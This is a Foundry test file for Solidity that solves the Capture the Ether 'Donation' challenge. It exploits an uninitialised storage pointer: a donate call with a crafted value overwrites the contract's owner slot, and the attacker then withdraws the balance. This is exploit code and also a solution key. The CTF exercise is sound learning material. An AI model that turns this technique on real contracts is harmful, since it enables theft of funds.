pragma solidity ^0.8.0;

import "forge-std-v1.5.0/Test.sol";
import "src/capture-the-ether/Donation.sol";

// after 0.8.x, cannot use storage pointer without explicitly assigning it to a valid storage location
contract DonationTest is Test {
    Donation instance;
    address alice = makeAddr("alice");

    receive() external payable {}

    function setUp() public {
        vm.deal(alice, 2 ether);
        instance = new Donation{value: 1 ether}();
    }

    function test() public {
        assertFalse(instance.isComplete());
        assertEq(instance.owner(), address(this));

        console.logBytes32(vm.load(address(instance), bytes32(uint256(0))));
        console.logBytes32(vm.load(address(instance), bytes32(uint256(1))));

        uint256 value = uint256(uint160(alice)) / 1e36;
        vm.startPrank(alice);
        instance.donate{value: value}(uint160(alice));

        console.logBytes32(vm.load(address(instance), bytes32(uint256(0))));
        console.logBytes32(vm.load(address(instance), bytes32(uint256(1))));

        assertEq(instance.owner(), alice);
        instance.withdraw();

        assertTrue(instance.isComplete());
    }
}
